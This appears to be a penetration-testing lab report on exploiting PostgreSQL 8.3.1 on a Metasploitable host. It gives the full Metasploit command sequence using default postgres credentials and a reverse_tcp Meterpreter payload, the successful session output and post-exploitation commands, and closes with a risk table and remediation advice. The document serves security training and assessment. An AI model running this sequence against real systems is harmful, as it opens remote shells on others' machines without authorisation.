# Exploitation Phase – 3. PostgreSQL Linux Payload Execution

---

## Vulnerability Phase Identification

**Phase:** Exploitation  
**Vulnerability Identified During:** Scanning & Vulnerability Assessment  

**Affected Service:** PostgreSQL

**Service Version:** 8.3.1

**Port:** TCP 5432 

This vulnerability was identified during service enumeration and confirmed during vulnerability assessment using Nmap and Metasploit auxiliary modules.

---

## Vulnerability Overview

PostgreSQL on Linux can be exploited via payload execution by leveraging the ability to load and execute shared object files (.so) on the target host.

By exploiting this feature through Metasploit’s postgres_payload module, an attacker can gain remote code execution with the privileges of the PostgreSQL user (postgres), which can sometimes be escalated to root depending on misconfigurations.

### Impact
- Remote Code Execution (RCE)
- User-level access(Postgres)
- Potential privilege escalation to root
- Full system compromise if misconfigurations exist

This is considered a ** high-impact vulnerability**.

---

## Tool Used: Metasploit Framework

### Why This Tool Is Used
- Provides a dedicated module for PostgreSQL payload execution
- Automates shared object upload and reverse shell payload execution
- Supports both x86 and x86_64 Linux targets
- Validates vulnerability impact through live exploitation

### Tool Explanation
The module exploit/linux/postgres/postgres_payload allows Metasploit to connect to a running PostgreSQL service, upload a payload as a shared object (.so) file, and execute it to spawn a reverse Meterpreter session on the attacker's machine.

---

## Exploit Module Information

- **Module Name:** `exploit/linux/postgres/postgres_payload`
- **Payload Used:** `linux/x86/meterpreter/reverse_tcp`
- **Exploit Type:** Remote reverse shell (Meterpreter)
- **Default Listen Port:** 4444

---

## Exploitation Command Sequence

    msfconsole -q
    use exploit/linux/postgres/postgres_payload
    set RHOSTS 192.168.56.102
    set RPORT 5432
    set USERNAME postgres
    set PASSWORD postgres
    set DATABASE postgres
    set LHOST 192.168.56.1
    set LPORT 4444
    set payload linux/x86/meterpreter/reverse_tcp
    exploit

## Exploit Output (Successful)

    [*] Started reverse TCP handler on 192.168.56.1:4444
    [*] 192.168.56.102:5432 - Uploaded as /tmp/KpozmWiC.so
    [*] Sending stage (1062760 bytes) to 192.168.56.102
    [*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.102:57407)

## Post-Exploitation Validation
Command Executed:

    meterpreter > getuid

Output:

    Server username: postgres
Confirms user-level access under PostgreSQL account..
Command

    meterpreter > sysinfo
Output

    Computer     : metasploitable.localdomain
    OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
    Architecture : i686
    Meterpreter  : x86/linux

Command

    meterpreter > ipconfig
Output

    eth0: 192.168.56.102
    lo: 127.0.0.1

Command

    meterpreter > pwd
    meterpreter > ls
Output

    /var/lib/postgresql/8.3/main

Output lists PostgreSQL data directories and configuration files.

## Database & Credential Verification
- Database: postgres
- Username: postgres
- Password: postgres
Successful exploitation confirms valid database credentials.

## What Was Achieved Through This Exploit
- User-level shell under postgres
- Ability to read/write PostgreSQL files
- Full access to database files, logs, and configuration
- Potential for privilege escalation to root if misconfigurations exist
- Pivoting opportunity for internal network compromise

## Risk Assessment
| Fctor | Severity |
|---|------|
| Authentication Bypass | Medium | 
| Remote Code Execution | High | 
| Privilege Level | PostgreSQL user | 
| Exploit Complexity | Low |
| Impact | Full Database Compromise, Potential System Compromise |

## Remediation Recommendations
- Restrict PostgreSQL access to trusted hosts only
- Disable untrusted shared object loading in PostgreSQL
- Use strong passwords for database users
- Upgrade PostgreSQL to supported versions
- Monitor /tmp and database directories for unauthorized files
- Implement firewall and network segmentation
- Audit privileges of PostgreSQL user to prevent escalation

## Conclusion
Exploitation of PostgreSQL via Linux payload execution allows attackers to gain control over the database service and potentially escalate privileges to root.

Successful exploitation demonstrates the importance of database hardening, network restrictions, and credential management in reducing attack surface.

---
